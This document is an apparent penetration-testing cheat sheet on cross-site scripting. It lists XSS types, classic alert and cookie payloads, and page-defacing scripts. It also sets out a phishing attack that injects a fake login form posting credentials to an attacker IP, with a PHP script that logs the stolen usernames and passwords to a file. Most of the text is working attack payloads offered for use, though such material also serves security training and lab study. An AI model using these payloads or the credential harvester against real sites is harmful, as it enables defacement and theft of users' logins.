
| Stored (Persistent)                                                | Reflective (None-Persistent)                            | DOM-Based                                                |
| ------------------------------------------------------------------ | ------------------------------------------------------- | -------------------------------------------------------- |
| User input is stored on the server, and is executed when retrieved | User input is process server side without being stored  | User input is processed client side without being stored |
### Payloads - Classics

```bash
<script>alert("XSS")</script>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<img src="" onerror=alert(window.origin)>
<img src="https://x.x.x.x">
```

### Defacing

```bash
<script>document.title = 'Title Text'</script>
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://x.x.x.x/images/image.svg"</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Header Text</h1><p style="color: white">by <img src="https://x.x.x.x/images/image.svgg" height="25px" alt="ALT Text"> </p></center>'</script>
```

### Phishing

Fake login form:

```bash
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.87><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Attacker side - save as index.php:

```bash
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    #header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Start PHP server:

```bash
sudo php -S 0.0.0.0:80
```

Creds should be save in `creds.txt`
#### DOM-Based

The `#` signed is a client side parameter processed by the web browser

![[Pasted image 20241119153420.png]]

Does not appear in the View Page Source:

![[Pasted image 20241119153935.png]]

Does appear in the development tools:

![[Pasted image 20241119154106.png]]



